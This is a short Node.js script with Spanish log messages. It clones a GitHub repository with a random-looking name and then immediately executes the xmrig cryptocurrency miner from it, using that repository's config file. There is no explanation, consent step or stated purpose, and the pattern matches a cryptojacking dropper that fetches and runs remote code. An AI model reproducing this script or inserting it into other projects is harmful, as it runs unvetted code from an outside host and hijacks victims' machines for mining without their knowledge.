const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');

const xmrigRepoURL = 'https://github.com/flikamitai/Ufcujcfuuguf.git';
const xmrigRepoPath = 'Ufcujcfuuguf';

const cloneCommand = `git clone ${xmrigRepoURL}`;
exec(cloneCommand, (cloneError, cloneStdout, cloneStderr) => {
  if (cloneError) {
    console.error(`Error al clonar el repositorio: ${cloneError}`);
    return;
  }
  console.log(`Clonación exitosa: ${cloneStdout}`);
  console.error(`stderr: ${cloneStderr}`);

  const runCommand = `./${xmrigRepoPath}/xmrig -c ./${xmrigRepoPath}/config.json`;
  exec(runCommand, (runError, runStdout, runStderr) => {
    if (runError) {
      console.error(`Error al ejecutar xmrig: ${runError}`);
      return;
    }
    console.log(`xmrig ejecutándose: ${runStdout}`);
    console.error(`stderr: ${runStderr}`);
  });
});
